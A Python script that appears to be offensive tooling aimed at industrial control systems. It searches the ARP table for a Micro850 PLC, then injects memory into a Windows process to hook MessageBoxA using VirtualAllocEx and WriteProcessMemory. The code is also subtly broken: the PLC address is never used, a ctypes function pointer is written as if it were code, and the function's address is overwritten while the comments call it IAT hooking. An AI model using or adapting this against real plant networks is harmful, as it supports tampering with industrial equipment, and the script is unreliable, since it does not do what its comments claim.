import os
import time
import ctypes
import socket
import struct
import subprocess
from ctypes import wintypes

# Constants for Windows API
PAGE_EXECUTE_READWRITE = 0x40
PROCESS_ALL_ACCESS = 0x1F0FFF
VIRTUAL_MEM = 0x1000

# Define Windows API functions
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
WriteProcessMemory = kernel32.WriteProcessMemory
ReadProcessMemory = kernel32.ReadProcessMemory
VirtualAllocEx = kernel32.VirtualAllocEx
VirtualFreeEx = kernel32.VirtualFreeEx
OpenProcess = kernel32.OpenProcess
CloseHandle = kernel32.CloseHandle
GetProcAddress = kernel32.GetProcAddress
GetModuleHandle = kernel32.GetModuleHandleW

# Function to discover PLC's IP address using ARP scanning
def discover_plc_ip():
    print("Scanning network for PLC...")
    # Use ARP to get IP addresses in the local network
    arp_output = subprocess.check_output(["arp", "-a"]).decode()
    for line in arp_output.splitlines():
        if "Micro850" in line:  # Assuming the PLC's hostname contains "Micro850"
            ip = line.split()[0]
            print(f"PLC found at IP: {ip}")
            return ip
    print("PLC not found on the network.")
    return None

# Function to hook into a Windows API function using IAT hooking
def hook_api(process_id, dll_name, func_name, hook_func):
    # Open the target process
    process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
    if not process_handle:
        print("Failed to open process.")
        return

    # Get the address of the function to hook
    module_handle = GetModuleHandle(dll_name)
    if not module_handle:
        print(f"Failed to get module handle for {dll_name}.")
        CloseHandle(process_handle)
        return

    func_address = GetProcAddress(module_handle, func_name)
    if not func_address:
        print(f"Failed to get address of {func_name}.")
        CloseHandle(process_handle)
        return

    # Allocate memory in the target process for the hook function
    remote_memory = VirtualAllocEx(process_handle, None, ctypes.sizeof(hook_func), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
    if not remote_memory:
        print("Failed to allocate memory in the target process.")
        CloseHandle(process_handle)
        return

    # Write the hook function to the allocated memory
    if not WriteProcessMemory(process_handle, remote_memory, ctypes.byref(hook_func), ctypes.sizeof(hook_func), None):
        print("Failed to write hook function to target process.")
        VirtualFreeEx(process_handle, remote_memory, 0, VIRTUAL_MEM)
        CloseHandle(process_handle)
        return

    # Overwrite the original function's address in the IAT with the hook function's address
    if not WriteProcessMemory(process_handle, func_address, ctypes.byref(remote_memory), ctypes.sizeof(remote_memory), None):
        print("Failed to overwrite function address in IAT.")
        VirtualFreeEx(process_handle, remote_memory, 0, VIRTUAL_MEM)
        CloseHandle(process_handle)
        return

    print(f"Hook successfully installed for {func_name}.")
    CloseHandle(process_handle)

# Main function
if __name__ == "__main__":
    # Step 1: Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if not plc_ip:
        exit(1)

    # Step 2: Hook into a Windows API function (example: MessageBoxA)
    process_id = os.getpid()  # Replace with the target process ID if different
    dll_name = "user32.dll"
    func_name = "MessageBoxA"
    hook_func = ctypes.CFUNCTYPE(wintypes.HWND, wintypes.LPCSTR, wintypes.LPCSTR, wintypes.UINT)(lambda hWnd, lpText, uType: 0)

    hook_api(process_id, dll_name, func_name, hook_func)